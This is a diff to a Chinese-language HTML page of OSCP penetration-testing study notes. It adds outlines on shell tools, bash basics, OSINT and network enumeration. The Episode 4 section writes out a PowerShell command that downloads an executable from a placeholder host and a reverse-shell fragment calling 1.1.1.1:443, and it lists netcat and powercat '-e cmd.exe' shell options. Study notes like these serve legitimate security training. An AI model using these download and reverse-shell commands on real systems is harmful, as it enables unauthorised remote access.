@@ -181,10 +181,13 @@
 <li><a href="#ch5-%E6%92%B0%E5%AF%AB%E5%A0%B1%E5%91%8A">Ch.5 撰寫報告</a></li>
 </ul>
 </li>
-<li><a href="#oscp%E5%BD%B1%E7%89%87%E6%95%99%E6%9D%90">OSCP影片教材</a>
+<li><a href="#oscp-pt-kali-%E5%BD%B1%E7%89%87%E6%95%99%E6%9D%90">OSCP PT Kali 影片教材</a>
 <ul>
-<li><a href="#ch2-ch3-1">Ch.2 Ch.3</a></li>
-<li><a href="#ch4-1">Ch.4</a></li>
+<li><a href="#episode2-episode3">Episode.2 Episode.3</a></li>
+<li><a href="#episode4">Episode.4</a></li>
+<li><a href="#episode-5-bash-scripts">Episode. 5 Bash scripts</a></li>
+<li><a href="#episode-6-%E8%A2%AB%E5%8B%95%E8%B3%87%E8%A8%8A%E6%94%B6%E9%9B%86">Episode. 6 被動資訊收集</a></li>
+<li><a href="#episode-7-%E4%B8%BB%E5%8B%95%E8%B3%87%E8%A8%8A%E6%94%B6%E9%9B%86">Episode. 7 主動資訊收集</a></li>
 </ul>
 </li>
 <li><a href="#%E5%8F%83%E8%80%83%E7%B6%B2%E9%A0%81">參考網頁</a></li>
@@ -232,7 +235,7 @@
 <li>active recon
 <ol>
 <li>port scanning</li>
-<li>service enumium</li>
+<li>service enumeration</li>
 </ol>
 </li>
 <li>Vulnerability scanning</li>
@@ -600,8 +603,7 @@ ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=n
 </ol>
 <h3 id="ch4"><a class="header" href="#ch4">Ch.4</a></h3>
 <ol>
-<li>
-<p>有效的學習策略</p>
+<li>有效的學習策略
 <ol>
 <li>學習理論
 <ol>
@@ -649,17 +651,25 @@ ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=n
 <li>常用方法和策略</li>
 <li>考試意見和建議</li>
 <li>實際步驟</li>
+<li>cornell note</li>
+<li>feynman tech</li>
+<li>SQ3R</li>
 </ol>
 </li>
-<li>
-<p>cornell note</p>
-</li>
-<li>
-<p>feynman tech</p>
-</li>
-<li>
-<p>SQ3R</p>
-</li>
+<li>了解示範方法的含義</li>
+<li>為未知場景做好準備</li>
+<li>了解遠端/非同步學習潛在的挑戰</li>
+<li>演示方法</li>
+<li>邊做邊學，自行延伸學習週邊項目</li>
+<li>學習 技巧/概念/邏輯，而非只是使用 工具/命令/語法</li>
+<li>面對困難，期待意外，保持努力嚐試心態The Try harder Mindset</li>
+<li>情境學習與交錯，現實場景中實踐方法，同時使用多種工具或方法進行</li>
+<li>對問題深入探討與可能的變化</li>
+<li>可能解決方案，借花獻佛/借刀殺人</li>
+<li>方析方法</li>
+<li>嚐試預測結果</li>
+<li>適當的&quot;離開/跳脫&quot;眼前未能解決的問題，避免陷入困境/陷阱</li>
+<li>戰略與常用方法</li>
 </ol>
 <h3 id="ch5-撰寫報告"><a class="header" href="#ch5-撰寫報告">Ch.5 撰寫報告</a></h3>
 <p>官方有範本與建議事項,官方寫&quot;強烈建議&quot;</p>
@@ -667,8 +677,8 @@ ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=n
 </code></pre>
 <p><a href="https://help.offsec.com/hc/en-us/articles/360046787731-PEN-200-Reporting-Requirements#pwk-report-templates">PEN-200 Reporting Requirements</a><br />
 <a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown">noraj - OSCP-Exam-Report-Template-Markdown</a></p>
-<h2 id="oscp影片教材"><a class="header" href="#oscp影片教材">OSCP影片教材</a></h2>
-<h3 id="ch2-ch3-1"><a class="header" href="#ch2-ch3-1">Ch.2 Ch.3</a></h3>
+<h2 id="oscp-pt-kali-影片教材"><a class="header" href="#oscp-pt-kali-影片教材">OSCP PT Kali 影片教材</a></h2>
+<h3 id="episode2-episode3"><a class="header" href="#episode2-episode3">Episode.2 Episode.3</a></h3>
 <ol>
 <li>基本系統架構與指令操作
 <ol>
@@ -710,49 +720,207 @@ ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=n
 </ol>
 </li>
 </ol>
-<h3 id="ch4-1"><a class="header" href="#ch4-1">Ch.4</a></h3>
+<h3 id="episode4"><a class="header" href="#episode4">Episode.4</a></h3>
 <ol>
-<li>
-<p>了解示範方法的含義</p>
+<li>netcat
+<ol>
+<li>bind shell, -e cmd.exe</li>
+<li>reverse shell</li>
+<li>file transfer</li>
+</ol>
 </li>
-<li>
-<p>為未知場景做好準備</p>
+<li>socat
+<ol>
+<li>file transfer</li>
+<li>reverse shell</li>
+<li>encrypt binshell</li>
+</ol>
 </li>
-<li>
-<p>了解遠端/非同步學習潛在的挑戰</p>
+<li>powershell
+<ol>
+<li>file transfer
+<ol>
+<li>powershell -c &quot;(new-object System.Net.WebClient).Downloadfile('http://1.1.1.1/wget.exe','C:\wget.exe')&quot;</li>
+<li>reverse shell, Sockets.TCPClient('1.1.1.1',443);</li>
+<li>binshell</li>
+</ol>
 </li>
-<li>
-<p>演示方法</p>
+</ol>
 </li>
-<li>
-<p>邊做邊學，自行延伸學習週邊項目</p>
+<li>powercat
+<ol>
+<li>file transfer, -i</li>
+<li>reverse shell, -e cmd.exe</li>
+<li>stand-alone payloads, -g</li>
+</ol>
 </li>
-<li>
-<p>學習 技巧/概念/邏輯，而非只是使用 工具/命令/語法</p>
+<li>wireshark</li>
+<li>tcpdump
+<ol>
+<li>filter traffic</li>
+<li>-X, hex and ascii</li>
+<li>advance filter</li>
+</ol>
 </li>
-<li>
-<p>面對困難，期待意外，保持努力嚐試心態The Try harder Mindset</p>
+</ol>
+<h3 id="episode-5-bash-scripts"><a class="header" href="#episode-5-bash-scripts">Episode. 5 Bash scripts</a></h3>
+<ol>
+<li>echo</li>
+<li>exec, ./</li>
+<li>variables,'' or &quot;&quot;</li>
+<li>export</li>
+<li>執行subshell $(), ``</li>
+<li>arguments</li>
+<li>ret, $?</li>
+<li>read user input, read</li>
+<li>if,elif,else</li>
+<li>boolen conditions, &amp;&amp; and, || or,</li>
+<li>loops, for loops, while loops</li>
+<li>functions,
+<ol>
+<li>functions,funcA(){echo a};funcA</li>
+<li>local var</li>
+</ol>
 </li>
-<li>
-<p>情境學習與交錯，現實場景中實踐方法，同時使用多種工具或方法進行</p>
+</ol>
+<h3 id="episode-6-被動資訊收集"><a class="header" href="#episode-6-被動資訊收集">Episode. 6 被動資訊收集</a></h3>
+<ol>
+<li>OSINT,公開來源情資(Open-source intelligence)</li>
+<li>website recon
+<ol>
+<li>email format</li>
+</ol>
 </li>
-<li>
-<p>對問題深入探討與可能的變化</p>
+<li>whois enumeration, domainname register, NS, IP reverse</li>
+<li>google hacking
+<ol>
+<li>site:</li>
+<li>filetype:</li>
+<li>title:index</li>
+<li>exploit-db,google hacking</li>
+</ol>
 </li>
-<li>
-<p>可能解決方案，借花獻佛/借刀殺人</p>
+<li>netcraft</li>
+<li><a href="https://github.com/lanmaster53/recon-ng">recon-ng</a>
+<ol>
+<li>marketplace module</li>
+</ol>
 </li>
-<li>
-<p>方析方法</p>
+<li>open source code
+<ol>
+<li>github repos</li>
+<li>gitleak</li>
+</ol>
 </li>
-<li>
-<p>嚐試預測結果</p>
+<li>shodan,connect device
+<ol>
+<li>hostname:a.example.com</li>
+</ol>
 </li>
-<li>
-<p>適當的&quot;離開/跳脫&quot;眼前未能解決的問題，避免陷入困境/陷阱</p>
+<li><a href="https://securityheaders.com">securityheaders</a></li>
+<li><a href="https://www.ssllabs.com/ssltest/">ssl server test</a></li>
+<li>pastebin, gists</li>
+<li>user information gathering</li>
+<li>email harvesting
+<ol>
+<li><a href="https://github.com/laramies/theHarvester">theharvester</a></li>
+</ol>
 </li>
-<li>
-<p>戰略與常用方法</p>
+<li>password dumps
+<ol>
+<li>wordlists, rockyou</li>
+</ol>
+</li>
+<li>social media tools
+<ol>
+<li><a href="https://www.social-searcher.com">social-searcher</a></li>
+</ol>
+</li>
+<li>site-specific tools
+<ol>
+<li><a href="https://digi.ninja/projects/twofi.php">twofi - Twitter Words of Interest</a></li>
+<li><a href="https://github.com/initstring/linkedin2username">linkedin2username</a></li>
+<li><a href="https://stackoverflow.com">stack overflow</a></li>
+</ol>
+</li>
+<li>information gathering framework
+<ol>
+<li><a href="https://osintframework.com">OSINT Framework</a></li>
+<li><a href="https://www.maltego.com">maltego</a></li>
+</ol>
+</li>
+</ol>
+<h3 id="episode-7-主動資訊收集"><a class="header" href="#episode-7-主動資訊收集">Episode. 7 主動資訊收集</a></h3>
+<ol>
+<li>DNS enumeration</li>
+<li>Interacting with a DNS Server
+<ol>
+<li>A, TXT, MX</li>
+</ol>
+</li>
+<li>automating lookups</li>
+<li>Forward Lookup Brute Force
+<ol>
+<li>wordlists</li>
+</ol>
+</li>
+<li>Reverse Lookup Brute Force</li>
+<li>dns zoen transfer
+<ol>
+<li>host -l a.example.com ns.example.com</li>
+<li>axfr 取得所有dns記錄</li>
+</ol>
+</li>
+<li>Relevant Tools in kali linux
+<ol>
+<li>dnsrecon</li>
+<li>dnsenum</li>
+</ol>
+</li>
+<li>Port scanning
+<ol>
+<li>TCP port scanning</li>
+<li>UDP port scanning</li>
+<li>nmap
+<ol>
+<li>stealth scan,-sS</li>
+<li>tcp connect scanning,-sT</li>
+<li>UDP, -sU</li>
+<li>network swipping,-sn</li>
+<li>-oG a.txt</li>
+<li>OS fingerprint, -O</li>
+<li>banner grathering, -sV -sT</li>
+<li>NSE</li>
+</ol>
+</li>
+<li>masscan</li>
+</ol>
+</li>
+<li>SMB enumeration
+<ol>
+<li>scanning for the netbios service, port 139,446</li>
+<li>nbtscan, port 137</li>
+<li>nmap nse script</li>
+</ol>
+</li>
+<li>NFS enumeration
+<ol>
+<li>scanning form nfs share, rpc info, port 111</li>
+<li>NSE for NFS</li>
+<li>change uid</li>
+</ol>
+</li>
+<li>SMTP enumeration
+<ol>
+<li>VRFY root</li>
+</ol>
+</li>
+<li>SNMP enumeration
+<ol>
+<li>The SNMP MIB tree</li>
+<li>nmap -sU --open</li>
+<li>windows SNMP MIB list, snmpwalk -c public -v 1 IP OID</li>
+</ol>
 </li>
 </ol>
 <h2 id="參考網頁"><a class="header" href="#參考網頁">參考網頁</a></h2>
